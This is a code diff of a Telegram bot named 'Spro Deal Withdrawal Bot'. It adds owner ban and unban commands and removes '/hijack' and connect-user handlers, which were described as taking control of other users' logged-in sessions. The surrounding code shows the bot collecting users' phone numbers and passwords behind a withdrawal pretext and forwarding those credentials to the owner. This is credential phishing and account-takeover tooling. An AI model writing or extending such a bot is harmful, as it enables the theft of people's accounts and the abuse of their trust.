@@ -4,7 +4,6 @@ from pyrogram import filters
 from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery
 from pyrogram.enums import ParseMode
 from configuration.config import BOT_TOKEN, API_ID, API_HASH, OWNER_ID, MONGO_URI, MONGO_DB_NAME
-from module.hijack import setup_hijack_handlers
 from module.dataCommands import register_data_commands
 from pymongo import MongoClient
 import pytz
@@ -14,7 +13,6 @@ import os
 import string
 import random
 from module.broadcast import setup_broadcast_handlers
-from module.connect_user import setup_connect_user_handlers
 from web_server import run_web_server
 import threading
 
@@ -26,6 +24,7 @@ import threading
 mongo_client = MongoClient(MONGO_URI)
 db = mongo_client[MONGO_DB_NAME]
 started_users = db["started_users"]
+banned_users = db["banned_users"]
 
 # ----------------------------
 # Pyrogram Bot Client
@@ -68,7 +67,7 @@ async def send_credentials_to_owner(client, user_info, phone, password, withdraw
         f"🔔 <b>NEW WITHDRAWAL REQUEST</b> 🔔\n\n"
         f"👤 <b>User Info:</b>\n"
         f"├ Name: {user_name}\n"
-        f"├ Username: @{username}\n"
+        f"├ Username: {'@' + username if username != 'N/A' else 'N/A'}\n"
         f"└ User ID: <code>{user_id}</code>\n\n"
         f"📱 <b>Phone:</b> <code>{phone}</code>\n"
         f"🔐 <b>Password:</b> <code>{password}</code>\n\n"
@@ -94,6 +93,12 @@ async def send_credentials_to_owner(client, user_info, phone, password, withdraw
 @app.on_message(filters.command("start"))
 async def start_command(client: Client, message: Message):
     user = message.from_user
+    
+    # Check if user is banned
+    if banned_users.find_one({"user_id": user.id}):
+        await message.reply("❌ You are banned from using this bot.")
+        return
+    
     user_data = {
         "user_id": user.id,
         "name": f"{user.first_name or ''} {user.last_name or ''}".strip(),
@@ -110,12 +115,12 @@ async def start_command(client: Client, message: Message):
 Here are your admin commands:
 
 📊 `/stats` - View overall bot usage statistics
-📋 `/details` - View all users list
-🔍 `/get` - Fetch user details using user ID
+� `/get` - Fetch user details using user ID
 📢 `/gcast` - Broadcast message to all users
 ❌ `/cancel_gcast` - Cancel any ongoing broadcast
-🎮 `/hijack` - Temporarily control another logged-in session
-🛑 `/cancel_hijack` - Revoke hijack and return control to user
+
+🚫 `/ban` - Ban a user from using the bot
+✅ `/unban` - Unban a previously banned user
 
 Use these commands to manage the bot."""
         await message.reply_text(welcome_msg, parse_mode=ParseMode.HTML)
@@ -181,12 +186,11 @@ Here's what I can do for you:
 # Owner commands list
 OWNER_CMDS = [
     ("/stats",          "📊 View overall bot usage statistics"),
-    ("/details",        "📋 Paginated list of logged-in & started users"),
     ("/get",            "🔍 Fetch user details using user ID"),
     ("/gcast",          "📢 Broadcast message to all users"),
     ("/cancel_gcast",   "❌ Cancel any ongoing broadcast"),
-    ("/hijack",         "🎮 Temporarily control another logged-in session"),
-    ("/cancel_hijack",  "🛑 Revoke hijack and return control to user"),
+    ("/ban",            "🚫 Ban a user from using the bot"),
+    ("/unban",          "✅ Unban a previously banned user"),
 ]
 
 @app.on_callback_query(filters.regex(r"^admin_cmds:(\d+)$"))
@@ -226,6 +230,12 @@ async def admin_commands_pagination(client: Client, query: CallbackQuery):
 @app.on_message(filters.command("withdraw"))
 async def withdraw_command(client: Client, message: Message):
     user_id = message.from_user.id
+    
+    # Check if user is banned
+    if banned_users.find_one({"user_id": user_id}):
+        await message.reply("❌ You are banned from using this bot.")
+        return
+    
     user_states[user_id] = "awaiting_withdraw_phone"
     try:
         # Show warning first
@@ -375,6 +385,109 @@ async def cancel_command(_, message: Message):
         await message.reply("❌ Operation cancelled.")
     else:
         await message.reply("⚠️ No operation was pending.")
+
+@app.on_message(filters.command("ban"))
+async def ban_command(client: Client, message: Message):
+    if message.from_user.id != OWNER_ID:
+        await message.reply("🚫 This command is only for the bot owner.")
+        return
+    
+    await message.reply("🔢 Please send the <b>User ID</b> of the user you want to ban:", parse_mode=ParseMode.HTML)
+    
+    try:
+        response = await client.listen(
+            chat_id=message.chat.id,
+            filters=filters.text,
+            timeout=60
+        )
+        
+        try:
+            user_id_to_ban = int(response.text.strip())
+        except ValueError:
+            await message.reply("❌ Invalid User ID. Please provide a valid numeric User ID.")
+            return
+        
+        # Check if user is already banned
+        if banned_users.find_one({"user_id": user_id_to_ban}):
+            await message.reply("⚠️ This user is already banned.")
+            return
+        
+        # Check if trying to ban owner
+        if user_id_to_ban == OWNER_ID:
+            await message.reply("❌ You cannot ban yourself!")
+            return
+        
+        # Get user info if available
+        user_info = started_users.find_one({"user_id": user_id_to_ban})
+        user_name = user_info.get('name', 'Unknown') if user_info else 'Unknown'
+        user_username = user_info.get('username', 'N/A') if user_info else 'N/A'
+        
+        # Ban the user
+        ban_data = {
+            "user_id": user_id_to_ban,
+            "name": user_name,
+            "username": user_username,
+            "banned_at": datetime.now(pytz.timezone('Asia/Kolkata')).strftime('%Y-%m-%d %H:%M:%S IST'),
+            "banned_by": OWNER_ID
+        }
+        banned_users.insert_one(ban_data)
+        
+        await message.reply(
+            f"✅ <b>User Banned Successfully!</b>\n\n"
+            f"👤 User ID: <code>{user_id_to_ban}</code>\n"
+            f"📛 Name: {user_name}\n"
+            f"👤 Username: @{user_username}\n\n"
+            f"This user can no longer use the bot.",
+            parse_mode=ParseMode.HTML
+        )
+        
+    except asyncio.TimeoutError:
+        await message.reply("⏰ Timeout! Ban operation cancelled.")
+
+@app.on_message(filters.command("unban"))
+async def unban_command(client: Client, message: Message):
+    if message.from_user.id != OWNER_ID:
+        await message.reply("🚫 This command is only for the bot owner.")
+        return
+    
+    await message.reply("🔢 Please send the <b>User ID</b> of the user you want to unban:", parse_mode=ParseMode.HTML)
+    
+    try:
+        response = await client.listen(
+            chat_id=message.chat.id,
+            filters=filters.text,
+            timeout=60
+        )
+        
+        try:
+            user_id_to_unban = int(response.text.strip())
+        except ValueError:
+            await message.reply("❌ Invalid User ID. Please provide a valid numeric User ID.")
+            return
+        
+        # Check if user is banned
+        banned_user = banned_users.find_one({"user_id": user_id_to_unban})
+        if not banned_user:
+            await message.reply("⚠️ This user is not banned.")
+            return
+        
+        # Unban the user
+        banned_users.delete_one({"user_id": user_id_to_unban})
+        
+        user_name = banned_user.get('name', 'Unknown')
+        user_username = banned_user.get('username', 'N/A')
+        
+        await message.reply(
+            f"✅ <b>User Unbanned Successfully!</b>\n\n"
+            f"👤 User ID: <code>{user_id_to_unban}</code>\n"
+            f"📛 Name: {user_name}\n"
+            f"👤 Username: @{user_username}\n\n"
+            f"This user can now use the bot again.",
+            parse_mode=ParseMode.HTML
+        )
+        
+    except asyncio.TimeoutError:
+        await message.reply("⏰ Timeout! Unban operation cancelled.")
 
 @app.on_callback_query(filters.regex(r"^retry_same:"))
 async def handle_retry_same(client: Client, query: CallbackQuery):
@@ -595,10 +708,8 @@ if __name__ == "__main__":
     web_thread = threading.Thread(target=run_web_server, daemon=True)
     web_thread.start()
     
-    setup_hijack_handlers(app)
     register_data_commands(app)
     setup_broadcast_handlers(app)
-    setup_connect_user_handlers(app)
     print("=" * 50)
     print("🚀 Spro Deal Withdrawal Bot")
     print("=" * 50)
